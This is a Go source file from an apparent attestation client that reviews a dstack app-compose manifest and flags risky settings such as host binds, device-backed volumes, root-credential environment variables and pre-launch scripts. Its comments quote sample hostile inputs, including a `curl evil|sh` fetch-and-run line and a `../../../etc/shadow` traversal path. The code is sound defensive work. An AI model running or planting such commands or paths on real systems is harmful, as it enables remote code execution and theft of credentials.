package evidence

// composereview.go reads an AUTHENTICATED app-compose and reports what it contains,
// against the rules that hold with no per-deployment configuration at all.
//
// WHY IT EXISTS. Hop 3 (brokerimages.json) pins the OS a provider boots; it says
// nothing about what runs inside. Two providers on the same audited image can run
// entirely different containers, because mr_config_id commits to the app-compose the
// OPERATOR chose, not to one we approved. Closing that needs a per-service baseline,
// and a baseline needs a manifest worth pinning. This is the tool that says how far a
// given manifest is from being one.
//
// WHAT IT IS NOT is a gate. Nothing here returns a verdict, and no caller may derive
// one: every rule below is a heuristic about a manifest we did not write, and a
// heuristic that refuses requests is a heuristic that takes a provider offline for
// being unusual. The adjudicating check is and stays byte-exact — the compose text
// versus a recorded baseline — with this as the input to WRITING that baseline. The
// three severities say what a reviewer owes each finding, not what a verifier should
// do about it:
//
//   - Blocking: no legitimate deployment needs this, so a baseline can refuse it
//     outright and the manifest should change before it becomes one.
//   - Justify: legitimate deployments DO need this, so a baseline has to name the
//     exception per service — someone has to write down why this service has it.
//   - Note: not a finding. A fact a reviewer needs and would otherwise have to dig
//     the manifest out by hand to see.
//
// IT READS WHAT IS WRITTEN, and that cuts both ways. An absent hardening key is not a
// finding — `user:` unset means root, `read_only:` unset means a writable rootfs — so
// a clean run is not a claim that a service is confined, only that it did not ask for
// anything this file knows to ask about. Conversely a key it has no rule for is
// reported at Justify rather than ignored: the alternative is a review that stays
// silent as docker-compose and dstack grow fields, which is the exact failure mode of
// checking a fixed list and calling it complete.
//
// THAT FALLBACK EXISTS AT ALL FOUR LEVELS, and it has to. The manifest nests —
// app-compose fields, top-level compose keys, service keys, volume-declaration keys —
// and a level with no fallback is a level where a rule can be undone from outside its
// own reach. The top-level `volumes:` section is the worked example: a named volume
// whose `driver_opts.device` is `/etc` makes `- etcbind:/host-etc` mean exactly what
// `- /etc:/host-etc` means, so a review of `services:` alone reported a clean manifest
// for a container reading the guest OS's own /etc. Every construct that can deliver a
// host path into a container therefore goes through ONE verdict function
// (hostPathVerdict): a direct bind, a named volume backed by a device, and a top-level
// secret/config `file:`. Three copies of those rules would have been three chances for
// one of them to be the lenient one — and NORMALIZATION lives inside that function for
// the same reason. Every rule there matches on a literal, so `//var/run/docker.sock`,
// `/./etc` and `/opt/../etc` each reported nothing while their canonical spellings were
// blocking; cleaning at the call sites instead would have been the same mistake one
// level down.
//
// SHAPE IS NEVER READ AS ABSENCE. Every reader that can fail returns an `ok`, and
// absent is (zero, true) while present-but-wrong-shape is (zero, false) — see the
// readers at the bottom. `pid: [host]`, `kms_enabled: "true"` and
// `pre_launch_script: ["curl evil|sh"]` are all the second case, and a reader that
// collapsed the two gave each of them a clean line. That is worse than having no rule,
// because a clean line is read as a verdict.
//
// THE HASH GATE IS NOT OPTIONAL, which is why ReviewCompose takes the compose_hash
// rather than a decoded manifest: before that check the text is whatever the provider
// (or anyone on the path) chose to send, and a review of attacker-chosen YAML is a
// review of nothing. There is no entry point here that skips it.

import (
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"path"
	"sort"
	"strings"

	"gopkg.in/yaml.v3"

	"github.com/0gfoundation/0g-pc-e2ee/client/compose"
	"github.com/0gfoundation/0g-pc-e2ee/protocol/attest"
)

// Severity is what a finding asks of the reader. See the file header: it ranks the
// reviewer's obligation, never a verifier's decision.
type Severity int

// Ordered by obligation so a report can sort descending and lead with the findings a
// manifest has to lose before it can be a baseline.
const (
	SeverityNote Severity = iota + 1
	SeverityJustify
	SeverityBlocking
)

func (s Severity) String() string {
	switch s {
	case SeverityBlocking:
		return "blocking"
	case SeverityJustify:
		return "justify"
	case SeverityNote:
		return "note"
	default:
		return fmt.Sprintf("severity(%d)", int(s))
	}
}

// Finding is one thing the review found.
type Finding struct {
	Severity Severity
	// Service is the compose service the finding is about, or "" when it is about the
	// app-compose as a whole. Kept separate from Detail so a report can group by it.
	Service string
	// Key is the manifest key that produced the finding, e.g. "privileged" or
	// "allowed_envs" — the thing to edit.
	Key string
	// Detail says what was found and, where it is not self-evident, what it grants.
	// A finding whose consequence a reader has to guess at gets ignored.
	Detail string
}

// ImageOrigin classifies an image reference by the namespace it was pushed to.
//
// This is REPORTING, not adjudication, and the distinction is the whole reason it is
// a separate field from any Finding. "Under our namespace" is a real property when
// the reference is digest-pinned — a pinned pull resolves scoped to that repository,
// so the bytes really are something that was pushed there — but it is not the
// property a baseline wants: it cannot distinguish the current official build from an
// official build with a year-old CVE, and every third-party image in a manifest
// (mysql, an exporter, a model server) is third-party for a legitimate reason. So the
// origin column tells a reviewer which lines they can resolve by asking us and which
// need an upstream answer, and nothing more.
type ImageOrigin int

const (
	// OriginNone: the service names no image (see Finding for the "build:" case).
	OriginNone ImageOrigin = iota
	// OriginFirstParty: our namespace on a registry we publish through.
	OriginFirstParty
	// OriginThirdParty: anything else, including an unqualified Docker Hub library
	// image.
	OriginThirdParty
	// OriginForeignRegistry: OUR namespace on a registry that is not ours. It is its own
	// state because it is neither answer: a pull-through mirror is a legitimate reason to
	// see it, and so is an image named to look like ours. Either way we cannot answer for
	// the contents, so calling it first-party would be false — and the namespace part of
	// the digest-pinning argument only holds when the registry is one we control.
	OriginForeignRegistry
)

func (o ImageOrigin) String() string {
	switch o {
	case OriginFirstParty:
		return "first-party"
	case OriginThirdParty:
		return "third-party"
	case OriginForeignRegistry:
		return "our-name/not-ours"
	default:
		return "no image"
	}
}

// firstPartyNamespace is the organisation whose builds we can answer for.
const firstPartyNamespace = "0gfoundation"

// firstPartyRegistries are the registries that namespace means anything on.
//
// ghcr.io is where we publish. Docker Hub — "docker.io", its "index.docker.io" spelling,
// and the implicit host of an unqualified reference — is included because a Hub
// namespace is globally unique, so "0gfoundation/x" there names one specific account
// rather than a string anyone can choose. On any other host the namespace is just a path
// segment the manifest's author picked, which is what made
// "evil.example.com/0gfoundation/broker" read as first-party.
var firstPartyRegistries = map[string]bool{
	"": true, "docker.io": true, "index.docker.io": true, "registry-1.docker.io": true,
	"ghcr.io": true,
}

// ReviewedService is one compose service as the review read it.
type ReviewedService struct {
	Name   string
	Ref    string
	Image  string
	Tag    string
	Digest string
	Origin ImageOrigin
}

// Pinned reports whether the reference commits to image CONTENT rather than to a
// name. Without a digest the compose hash pins the string "repo:tag", and what that
// tag resolves to is the registry's business, not the enclave's.
func (s ReviewedService) Pinned() bool { return s.Digest != "" }

// ComposeReview is everything one authenticated app-compose was found to contain.
type ComposeReview struct {
	// Name and Runner are the app-compose's own labels. Runner decides whether the
	// compose-text half of this review ran at all.
	Name   string
	Runner string
	// Features, AllowedEnvs are surfaced verbatim because both widen what the
	// deployment can be handed at boot, and both are chosen by the operator.
	Features    []string
	AllowedEnvs []string
	// FeaturesUnreadable distinguishes "the manifest enables no features" from "the
	// features field is there and this review could not decode it". Without the flag a
	// report renders both as "none", which in the second case is a claim the manifest
	// never made. There is a matching finding; the flag exists so the SUMMARY line
	// cannot contradict it.
	FeaturesUnreadable bool
	// Fields is every top-level app-compose key present, sorted. A report prints it so
	// a reader can see the manifest's whole surface, not the part this file has rules
	// for — the two diverge as dstack adds fields, and the gap is where a review goes
	// quietly stale.
	Fields []string
	// PreLaunchBytes and PreLaunchSHA256 describe pre_launch_script, which runs as
	// root inside the CVM before any container and is covered by NO image digest.
	// Reported by digest rather than by text because it is long, and because a digest
	// is what a reviewer can compare across providers to see whether they all run the
	// same one.
	PreLaunchBytes  int
	PreLaunchSHA256 string
	// Services is the compose file's services, in file order (the author's order — see
	// compose.ParseServices on why that is the answer and not an accident).
	Services []ReviewedService
	// Findings is sorted most-severe first, then by service and key, so two runs over
	// one manifest print identically.
	Findings []Finding
}

// Count returns how many findings carry the given severity.
func (r ComposeReview) Count(s Severity) int {
	n := 0
	for _, f := range r.Findings {
		if f.Severity == s {
			n++
		}
	}
	return n
}

// Summary is the one-line count, e.g. "2 blocking, 5 to justify, 7 notes".
func (r ComposeReview) Summary() string {
	return fmt.Sprintf("%d blocking, %d to justify, %d notes",
		r.Count(SeverityBlocking), r.Count(SeverityJustify), r.Count(SeverityNote))
}

// ReviewCompose gates raw on composeHash and then reviews what it authenticated.
//
// composeHash must come from a VERIFIED quote's mr_config_id — that is what makes the
// bytes meaningful, and it is the only reason raw may be fetched over an untrusted
// path. An error means nothing was reviewed: either the bytes are not the manifest
// the quote binds, or they are not JSON. Everything else, including a manifest with
// no compose text at all, comes back as a review with findings.
func ReviewCompose(raw []byte, composeHash [attest.ComposeHashLen]byte) (ComposeReview, error) {
	// The gate, and ONLY the gate. Deliberately not VerifyAppCompose: its AppCompose
	// decode is stricter than this review's field reads, so an authenticated manifest
	// with, say, an `allowed_envs` object would come back as an error — and a caller
	// returning that error reports a digest mismatch, accusing the provider of serving
	// a manifest its own quote does not bind. There is still one implementation of the
	// gate (gateAppCompose); what gets decoded past it is this function's business.
	if err := gateAppCompose(raw, composeHash); err != nil {
		return ComposeReview{}, err
	}

	// Every key, not the ones AppCompose decodes: the fields with rules below are a
	// subset of what a manifest may carry, and the report has to show both.
	var fields map[string]json.RawMessage
	if err := json.Unmarshal(raw, &fields); err != nil {
		return ComposeReview{}, fmt.Errorf("app-compose is not a JSON object: %w", err)
	}

	r := ComposeReview{Fields: sortedKeys(fields)}
	r.Name, _ = jsonString(fields["name"]) // a label; an unreadable one is not a finding
	r.reviewAppComposeFields(fields)

	text, ok := jsonString(fields["docker_compose_file"])
	switch {
	case !ok:
		r.add(SeverityBlocking, "", "docker_compose_file",
			"the field is not a string, so the compose text could not be read; nothing below the "+
				"app-compose level was reviewed")
	case strings.TrimSpace(text) == "":
		r.add(SeverityBlocking, "", "docker_compose_file",
			"the manifest embeds no compose text, so there is nothing to pin per service")
	default:
		r.reviewComposeText([]byte(text))
	}
	r.sortFindings()
	return r, nil
}

// add appends a finding.
func (r *ComposeReview) add(s Severity, service, key, detail string) {
	r.Findings = append(r.Findings, Finding{Severity: s, Service: service, Key: key, Detail: detail})
}

// sortFindings orders most-severe first, then by service and key, so the output is
// stable across runs. Findings arrive in walk order, which is stable for the compose
// text (file order) but not for the app-compose map, and a report that reshuffles
// itself between two runs of one unchanged manifest reads as the manifest changing.
func (r *ComposeReview) sortFindings() {
	sort.SliceStable(r.Findings, func(i, j int) bool {
		a, b := r.Findings[i], r.Findings[j]
		if a.Severity != b.Severity {
			return a.Severity > b.Severity
		}
		if a.Service != b.Service {
			return a.Service < b.Service
		}
		if a.Key != b.Key {
			return a.Key < b.Key
		}
		return a.Detail < b.Detail
	})
}

// knownAppComposeFields is every top-level app-compose key this file recognises —
// whether or not it has a rule. Membership means only "a human has looked at this
// field and decided what it means here"; anything absent is reported at Justify,
// because a field nobody has looked at is exactly the one worth reading.
var knownAppComposeFields = map[string]bool{
	"allowed_envs":               true,
	"bash_script":                true,
	"docker_compose_file":        true,
	"docker_config":              true,
	"features":                   true,
	"gateway_enabled":            true,
	"host_api_enabled":           true,
	"key_provider":               true,
	"key_provider_id":            true,
	"kms_enabled":                true,
	"local_key_provider_enabled": true,
	"manifest_version":           true,
	"name":                       true,
	"no_instance_id":             true,
	"pre_launch_script":          true,
	"public_logs":                true,
	"public_sysinfo":             true,
	"public_tcbinfo":             true,
	"runner":                     true,
	"secure_time":                true,
	"storage_fs":                 true,
	"tproxy_enabled":             true,
}

// rootAccessEnvs are the allowed_envs names that hand the untrusted host a way IN to
// the CVM — an SSH key or a root password injected at boot. Every other name in
// allowed_envs widens what the host can influence; these three end the argument that
// the enclave's contents are the enclave's own.
//
// Exact names, not a pattern. A prefix rule would fire Blocking on a name dstack might
// add that grants nothing, and a false Blocking is how a reviewer learns to skim the
// blocking lines. The generic allowed_envs Note lists every name in the manifest, so a
// fourth root-granting variable is visible even before it is named here.
var rootAccessEnvs = map[string]bool{
	"DSTACK_AUTHORIZED_KEYS": true,
	"DSTACK_ROOT_PASSWORD":   true,
	"DSTACK_ROOT_PUBLIC_KEY": true,
}

// reviewAppComposeFields applies the rules that live above the compose text.
func (r *ComposeReview) reviewAppComposeFields(fields map[string]json.RawMessage) {
	for _, k := range r.Fields {
		if !knownAppComposeFields[k] {
			r.add(SeverityJustify, "", k,
				"this review has no rule for the field; read it before treating the manifest as a baseline")
		}
	}

	// Not a security claim about the runner — a limit on this file. Everything below the
	// app-compose level assumes docker-compose semantics, so under any other runner a
	// clean compose half would mean "not read", not "nothing found". An ABSENT runner is
	// the same finding: the platform may have a default, and guessing which one would be
	// this review inventing the fact it is supposed to report. An UNREADABLE one has to
	// say so in its own words — "not set" would be false, and would send someone looking
	// for a field that is right there.
	runner, ok := jsonString(fields["runner"])
	r.Runner = runner
	switch {
	case !ok:
		r.add(SeverityBlocking, "", "runner",
			"runner is not a string, so it could not be read; nothing below is known to describe what runs")
	case runner == "docker-compose":
	case runner == "":
		r.add(SeverityBlocking, "", "runner",
			"runner is not set, and this review will not assume the platform's default; "+
				"without it, nothing below is known to describe what runs")
	default:
		r.add(SeverityBlocking, "", "runner", fmt.Sprintf(
			"runner is %q; this review reads docker-compose semantics, so it can say nothing about what runs", runner))
	}

	if feats, ok := jsonStrings(fields["features"]); ok {
		r.Features = feats
	} else {
		// FeaturesUnreadable, not an empty list: a report that printed "features=none" for
		// a features field it could not decode would state a thing the manifest does not say.
		r.FeaturesUnreadable = true
		r.add(SeverityJustify, "", "features",
			"features is not a list of strings, so which platform integrations are enabled could not be read")
	}

	if envs, ok := jsonStrings(fields["allowed_envs"]); !ok {
		r.add(SeverityBlocking, "", "allowed_envs",
			"allowed_envs is not a list of strings, so what the untrusted host may inject at boot could not be "+
				"read — including whether it can place a credential for root access")
	} else if r.AllowedEnvs = envs; len(envs) > 0 {
		r.add(SeverityNote, "", "allowed_envs", fmt.Sprintf(
			"the host may inject %s — names only, but each is an input the operator chose to accept at boot",
			strings.Join(envs, ", ")))
		for _, e := range envs {
			if rootAccessEnvs[strings.ToUpper(strings.TrimSpace(e))] {
				r.add(SeverityBlocking, "", "allowed_envs", fmt.Sprintf(
					"%s lets the untrusted host place a credential for interactive root access inside the CVM at boot; "+
						"with it, no measurement below says anything about what is running later", e))
			}
		}
	}

	// The key provider is in the TCB whether or not the manifest is honest about it,
	// and a V1 mr_config_id (the layout this fleet reports) exposes only compose_hash —
	// it does NOT fold key_provider_kind/id the way V2/V3 do. So which KMS holds the
	// app's keys cannot be read out of the quote here, and has to be established some
	// other way. That gap is the finding.
	if r.flag(fields, "kms_enabled", SeverityJustify) {
		kp, kpOK := jsonString(fields["key_provider"])
		id, idOK := jsonString(fields["key_provider_id"])
		switch {
		case kp == "" && kpOK:
			kp = "kms"
		case !kpOK:
			kp = "unreadable"
		}
		detail := fmt.Sprintf("keys come from an external key provider (%s", kp)
		switch {
		case !idOK:
			detail += ", id unreadable"
		case id != "":
			detail += ", id " + id
		}
		detail += "), which is therefore in the TCB. This manifest's mr_config_id layout " +
			"carries compose_hash alone, so WHICH provider that is cannot be read from the quote — " +
			"pin it out of band or the chain has an unmeasured hop"
		r.add(SeverityJustify, "", "kms_enabled", detail)
	}
	if r.flag(fields, "local_key_provider_enabled", SeverityNote) {
		r.add(SeverityNote, "", "local_key_provider_enabled",
			"keys are derived inside the CVM instead of from a KMS: one fewer party in the TCB, "+
				"and no way to recover or migrate the app's state off this machine")
	}

	if r.flag(fields, "public_logs", SeverityJustify) {
		r.add(SeverityJustify, "", "public_logs",
			"container logs are readable from outside the CVM; for a service handling sealed prompts, "+
				"anything a container logs is disclosed, so this is only safe if every image in the manifest is known not to log payloads")
	}
	if r.flag(fields, "public_sysinfo", SeverityNote) {
		r.add(SeverityNote, "", "public_sysinfo",
			"host and CVM system info is readable from outside; useful for debugging, and a fingerprint")
	}
	// These two fire on FALSE, so they cannot go through flag(): an unreadable value
	// there comes back false, and the rule would then assert "the CVM does not publish
	// tcb_info" about a field nobody could read. Read the tri-state directly.
	if v, ok := jsonBool(fields["public_tcbinfo"]); !ok {
		r.add(SeverityNote, "", "public_tcbinfo", "the value is not a boolean, so it could not be read")
	} else if has(fields, "public_tcbinfo") && !v {
		r.add(SeverityNote, "", "public_tcbinfo",
			"the CVM does not publish tcb_info, so its /v1/quote reply carries no app_compose and this review "+
				"cannot be run against it remotely — the manifest has to be supplied out of band")
	}
	if v, ok := jsonBool(fields["secure_time"]); !ok {
		r.add(SeverityNote, "", "secure_time", "the value is not a boolean, so it could not be read")
	} else if has(fields, "secure_time") && !v {
		r.add(SeverityNote, "", "secure_time",
			"the guest clock is the untrusted host's, so nothing inside the CVM can enforce an expiry or a freshness window")
	}

	if len(fields["docker_config"]) > 0 && string(fields["docker_config"]) != "null" &&
		string(fields["docker_config"]) != "{}" {
		r.add(SeverityNote, "", "docker_config",
			"images are pulled with registry credentials carried in the manifest, so a private registry is part "+
				"of the supply chain. Bounded by the digests above: a pinned reference cannot be substituted by "+
				"whoever serves it")
	}
	// Deliberately vague about the mechanism, because this file does not know it: the
	// field's meaning has moved across dstack versions. Saying "present, and this review
	// cannot tell you what it grants" is worth more than either silence or a guess
	// dressed up as a finding.
	if r.flag(fields, "host_api_enabled", SeverityJustify) {
		r.add(SeverityJustify, "", "host_api_enabled",
			"the host-API channel is on: a path between the CVM and the untrusted host that nothing in the "+
				"compose text describes. What it exposes depends on the dstack version, which this review does "+
				"not read — confirm it against that version before treating the manifest as a baseline")
	}

	// pre_launch_script is root TCB no image digest covers, which makes it the most
	// expensive place to read an unreadable value as absent.
	if s, ok := jsonString(fields["pre_launch_script"]); !ok {
		r.add(SeverityJustify, "", "pre_launch_script",
			"pre_launch_script is present but is not a string, so the root-privileged code that runs before "+
				"any container could not be read or digested")
	} else if strings.TrimSpace(s) != "" {
		sum := sha256.Sum256([]byte(s))
		r.PreLaunchBytes = len(s)
		r.PreLaunchSHA256 = fmt.Sprintf("%x", sum)
		r.add(SeverityJustify, "", "pre_launch_script", fmt.Sprintf(
			"%d bytes, sha256 %s: runs as root in the CVM before any container and is covered by no image digest, "+
				"so it is TCB that only the compose hash pins. Compare the digest across providers — a manifest-specific "+
				"script is a very different thing from the platform's stock one",
			r.PreLaunchBytes, r.PreLaunchSHA256))
	}
	if s, ok := jsonString(fields["bash_script"]); !ok || strings.TrimSpace(s) != "" {
		r.add(SeverityBlocking, "", "bash_script",
			"the manifest runs a bare shell script instead of (or alongside) a compose file; there are no per-service "+
				"images to pin, so nothing here can be reduced to a baseline")
	}
}

// flag reads a boolean app-compose switch. An unreadable value is REPORTED at sev and
// comes back false, so the rule that would have fired does not also emit a sentence
// describing a value nobody could read. Only for rules that fire on TRUE — a rule
// firing on false has to read the tri-state itself, because false is what this returns
// for "could not tell".
func (r *ComposeReview) flag(fields map[string]json.RawMessage, key string, sev Severity) bool {
	v, ok := jsonBool(fields[key])
	if !ok {
		r.add(sev, "", key, "the value is not a boolean, so it could not be read; treat it as set")
		return false
	}
	return v
}

// benignServiceKeys are the compose service keys that grant nothing beyond what the
// image already has. They are enumerated rather than assumed: the point of the table
// is that a key NOT in it — new to compose, or new to this manifest — surfaces as a
// finding instead of passing silently.
//
// "Benign" is about privilege, not about correctness or confidentiality: `ports`
// exposes a service, `environment` carries whatever the operator put in it, and both
// are here. They are pinned by the compose hash and reviewable by reading the text,
// which is what a baseline is for.
var benignServiceKeys = map[string]bool{
	"annotations":       true,
	"attach":            true,
	"blkio_config":      true,
	"cap_drop":          true,
	"command":           true,
	"container_name":    true,
	"cpu_shares":        true,
	"cpus":              true,
	"cpuset":            true,
	"credential_spec":   true,
	"depends_on":        true,
	"deploy":            true,
	"domainname":        true,
	"entrypoint":        true,
	"env_file":          true,
	"environment":       true,
	"expose":            true,
	"healthcheck":       true,
	"hostname":          true,
	"image":             true,
	"init":              true,
	"isolation":         true,
	"labels":            true,
	"logging":           true,
	"mac_address":       true,
	"mem_limit":         true,
	"mem_reservation":   true,
	"memswap_limit":     true,
	"networks":          true,
	"oom_score_adj":     true,
	"pids_limit":        true,
	"platform":          true,
	"ports":             true,
	"profiles":          true,
	"pull_policy":       true,
	"read_only":         true,
	"restart":           true,
	"runtime":           true,
	"shm_size":          true,
	"stdin_open":        true,
	"stop_grace_period": true,
	"stop_signal":       true,
	"storage_opt":       true,
	"tmpfs":             true,
	"tty":               true,
	"ulimits":           true,
	"user":              true,
	"working_dir":       true,
}

// knownComposeTopKeys is every top-level compose key this file recognises. The
// unknown-key fallback matters MORE here than at the other two levels: this is the one
// layer that can redefine what a service's mount means, so a key nobody has looked at
// is a key that can quietly undo a rule below.
var knownComposeTopKeys = map[string]bool{
	"configs":  true,
	"include":  true,
	"name":     true,
	"networks": true,
	"secrets":  true,
	"services": true,
	"version":  true,
	"volumes":  true,
}

// reviewComposeText walks the compose document. A document that will not parse is a
// blocking finding rather than an error: the bytes are authenticated, so "the manifest
// the enclave booted is not readable YAML" is a fact about the deployment and belongs
// in the report next to everything else.
//
// The top level is walked BEFORE the services, and not only for its own findings: a
// named volume's source lives up here, and `driver_opts: {type: none, device: /etc, o:
// bind}` makes `- etcbind:/host-etc` mean exactly what `- /etc:/host-etc` means. Reading
// services alone left every host-path rule one indirection away from being bypassed.
func (r *ComposeReview) reviewComposeText(doc []byte) {
	var root yaml.Node
	if err := yaml.Unmarshal(doc, &root); err != nil {
		r.add(SeverityBlocking, "", "docker_compose_file",
			fmt.Sprintf("the compose text does not parse as YAML: %v", err))
		return
	}
	if root.Kind != yaml.DocumentNode || len(root.Content) == 0 {
		r.add(SeverityBlocking, "", "docker_compose_file", "the compose text is an empty document")
		return
	}
	top := root.Content[0]
	if top.Kind != yaml.MappingNode {
		r.add(SeverityBlocking, "", "docker_compose_file", "the compose text is not a mapping")
		return
	}

	for i := 0; i+1 < len(top.Content); i += 2 {
		key := top.Content[i].Value
		if key == "" || knownComposeTopKeys[key] || strings.HasPrefix(key, "x-") {
			continue
		}
		r.add(SeverityJustify, "", "compose."+key,
			"this review has no rule for the top-level compose key; read it before treating the manifest as a "+
				"baseline — this is the level that can change what a service's mounts and networks resolve to")
	}

	// include: pulls in another compose file BY PATH. That file is not in the manifest,
	// so the compose hash does not cover it and nothing below describes what runs.
	if inc := mapValue(top, "include"); nodeHasContent(inc) {
		r.add(SeverityBlocking, "", "compose.include",
			"the manifest includes another compose file by path. That file is not part of the app-compose, so "+
				"the compose hash does not commit to it — what actually runs is not described by the measured manifest")
	}

	volumes := r.reviewTopLevelVolumes(mapValue(top, "volumes"))
	r.reviewFileSources(mapValue(top, "secrets"), "secrets")
	r.reviewFileSources(mapValue(top, "configs"), "configs")
	r.reviewTopLevelNetworks(mapValue(top, "networks"))

	services := mapValue(top, "services")
	if services == nil || services.Kind != yaml.MappingNode {
		r.add(SeverityBlocking, "", "docker_compose_file", "the compose text has no services mapping")
		return
	}

	mounts := &mountIndex{holders: map[string][]string{}, named: map[string]bool{}, volumes: volumes}
	for i := 0; i+1 < len(services.Content); i += 2 {
		name := services.Content[i].Value
		if name == "" {
			continue
		}
		body := services.Content[i+1]
		r.reviewService(name, body, mounts)
	}
	if len(r.Services) == 0 {
		r.add(SeverityBlocking, "", "docker_compose_file", "the compose text declares no services")
	}
	r.reviewSharedMounts(mounts)
}

// namedVolume is what a top-level `volumes:` entry declares, reduced to the two things
// that change what mounting it means.
type namedVolume struct {
	// HostPath is driver_opts.device when that is an absolute path — i.e. the volume is
	// a bind mount wearing a name. Mounting it is mounting that path, and the per-service
	// path rules are applied to it as such.
	HostPath string
	// External means the volume is not created by this manifest: its contents are
	// whatever already existed on the host under that name.
	External bool
	// Opaque marks a declaration this review could not reduce — an unreadable shape, or
	// a driver whose semantics it does not know. The per-service pass says so rather
	// than treating the volume as an empty local one.
	Opaque string
}

// knownVolumeKeys are the keys a top-level volume declaration may carry.
var knownVolumeKeys = map[string]bool{
	"driver": true, "driver_opts": true, "external": true, "labels": true, "name": true,
}

// networkFSTypes are driver_opts.type values that make a "local" volume a REMOTE
// filesystem: the bytes come off the network, from a server the manifest names and
// nothing measures.
var networkFSTypes = map[string]bool{"nfs": true, "nfs4": true, "cifs": true, "smb3": true, "ceph": true, "glusterfs": true}

// reviewTopLevelVolumes reduces `volumes:` to what each name means when mounted, and
// reports the declarations that are more than they look.
func (r *ComposeReview) reviewTopLevelVolumes(n *yaml.Node) map[string]namedVolume {
	out := map[string]namedVolume{}
	if n == nil {
		return out
	}
	if n.Kind != yaml.MappingNode {
		r.add(SeverityJustify, "", "compose.volumes",
			"the top-level volumes section is not a mapping, so what the named volumes below resolve to "+
				"could not be read")
		return out
	}
	for i := 0; i+1 < len(n.Content); i += 2 {
		name := n.Content[i].Value
		if name == "" {
			continue
		}
		decl := n.Content[i+1]
		key := "compose.volumes." + name

		// A bare `name:` with no body is an ordinary empty local volume.
		if !nodeHasContent(decl) {
			out[name] = namedVolume{}
			continue
		}
		if decl.Kind != yaml.MappingNode {
			out[name] = namedVolume{Opaque: "the declaration is not a mapping"}
			r.add(SeverityJustify, "", key, "the volume declaration could not be read, so what mounting it exposes is unknown")
			continue
		}

		var v namedVolume
		for j := 0; j+1 < len(decl.Content); j += 2 {
			k := decl.Content[j].Value
			if k == "" || knownVolumeKeys[k] || strings.HasPrefix(k, "x-") {
				continue
			}
			r.add(SeverityJustify, "", key+"."+k,
				"this review has no rule for the volume key; read it before treating the manifest as a baseline")
		}

		if v.External = declaredExternal(decl); v.External {
			r.add(SeverityJustify, "", key,
				"the volume is EXTERNAL: this manifest does not create it, so its contents are whatever already "+
					"existed on the host under that name. The compose hash commits to the name, not to what is in it")
		}

		if opts := mapValue(decl, "driver_opts"); nodeHasContent(opts) {
			if opts.Kind != yaml.MappingNode {
				v.Opaque = "driver_opts could not be read"
				r.add(SeverityJustify, "", key+".driver_opts",
					"driver_opts is not a mapping, so whether this volume is a host bind could not be read")
			} else {
				device, devOK := nodeScalar(mapValue(opts, "device"))
				fsType, _ := nodeScalar(mapValue(opts, "type"))
				switch {
				case !devOK:
					v.Opaque = "driver_opts.device could not be read"
					r.add(SeverityJustify, "", key+".driver_opts",
						"driver_opts.device is not a scalar, so the host path this volume binds could not be read")
				case networkFSTypes[strings.ToLower(fsType)]:
					v.Opaque = fmt.Sprintf("a %s mount of %s", fsType, device)
					r.add(SeverityBlocking, "", key,
						fmt.Sprintf("the volume is a %s mount of %s: its contents come off the network from a server "+
							"nothing here measures, so no image digest describes what the container reads", fsType, device))
				case strings.HasPrefix(device, "/"):
					// The bypass this whole section exists for: a host bind wearing a volume
					// name. Recorded so the per-service pass applies the same path rules it
					// would to a direct `- /etc:/x`.
					v.HostPath = device
				case device != "":
					v.Opaque = "device " + device
					r.add(SeverityJustify, "", key,
						fmt.Sprintf("the volume names device %q, which this review cannot resolve to a host path", device))
				}
			}
		}
		out[name] = v
	}
	return out
}

// reviewFileSources applies the host-path rules to top-level `secrets:`/`configs:`,
// whose `file:` is read from the HOST at deploy time and injected into containers —
// another way a host path reaches a container without appearing in any service's
// volumes.
func (r *ComposeReview) reviewFileSources(n *yaml.Node, section string) {
	if n == nil {
		return
	}
	if n.Kind != yaml.MappingNode {
		r.add(SeverityJustify, "", "compose."+section,
			fmt.Sprintf("the top-level %s section is not a mapping, so what it injects could not be read", section))
		return
	}
	for i := 0; i+1 < len(n.Content); i += 2 {
		name := n.Content[i].Value
		if name == "" {
			continue
		}
		decl := n.Content[i+1]
		key := "compose." + section + "." + name
		if decl.Kind != yaml.MappingNode {
			r.add(SeverityJustify, "", key, "the declaration could not be read, so what it injects is unknown")
			continue
		}
		if declaredExternal(decl) {
			r.add(SeverityJustify, "", key,
				"external: the content is whatever the host already holds under that name, which this manifest "+
					"does not describe")
		}
		if env, ok := nodeScalar(mapValue(decl, "environment")); ok && env != "" {
			r.add(SeverityJustify, "", key, fmt.Sprintf(
				"the content comes from environment variable %s at deploy time, so it is chosen outside the "+
					"measured manifest", env))
		}
		file, ok := nodeScalar(mapValue(decl, "file"))
		if !ok {
			r.add(SeverityJustify, "", key, "the file: path is not a scalar, so what it reads could not be determined")
			continue
		}
		if file == "" {
			continue
		}
		// Same three cases as a mount source, and the relative one has to be reported for
		// the same reason: `file: ../../../etc/shadow` resolves against the deployment
		// directory, which the manifest does not record. hostPathVerdict returns nothing
		// for it — path.Clean leaves a relative path relative — so without this branch a
		// host path reached containers through the section this PR added, unremarked, while
		// the identical case on a volume was reported.
		if !strings.HasPrefix(file, "/") {
			r.add(SeverityJustify, "", key, fmt.Sprintf(
				"reads %s from the host and injects it into containers, by a RELATIVE path: what it reads depends "+
					"on the directory the deployment was brought up from, which is not in the manifest", file))
			continue
		}
		if sev, clean, why := hostPathVerdict(file); why != "" {
			r.add(sev, "", key, fmt.Sprintf("reads %s%s from the host and injects it into containers: %s",
				file, normalizedAs(file, clean), why))
		}
	}
}

// reviewTopLevelNetworks reports the networks this manifest does not create.
func (r *ComposeReview) reviewTopLevelNetworks(n *yaml.Node) {
	if n == nil || n.Kind != yaml.MappingNode {
		return
	}
	for i := 0; i+1 < len(n.Content); i += 2 {
		name := n.Content[i].Value
		decl := n.Content[i+1]
		if name == "" || decl.Kind != yaml.MappingNode {
			continue
		}
		if declaredExternal(decl) {
			r.add(SeverityJustify, "", "compose.networks."+name,
				"the network is EXTERNAL: the containers join something that already exists on the host, so what "+
					"else is reachable on it is not described by this manifest")
		}
	}
}

// mountIndex accumulates the compose file's mounts across services so the
// cross-service pass can run after every service has been read.
//
// named is what keeps that pass from repeating work: a source that already produced a
// per-service finding (the guest-agent socket, a host tree) has been described
// precisely, by service, with what it grants. Saying "and it is shared" about it
// afterwards is the same fact stated worse, and two findings for one mount make a
// reviewer believe there are two things to fix.
type mountIndex struct {
	holders map[string][]string
	named   map[string]bool
	// volumes is the top-level `volumes:` section, reduced. A named volume's source is
	// declared up there, so without this the per-service pass cannot tell an ordinary
	// empty volume from a host bind wearing a name.
	volumes map[string]namedVolume
}

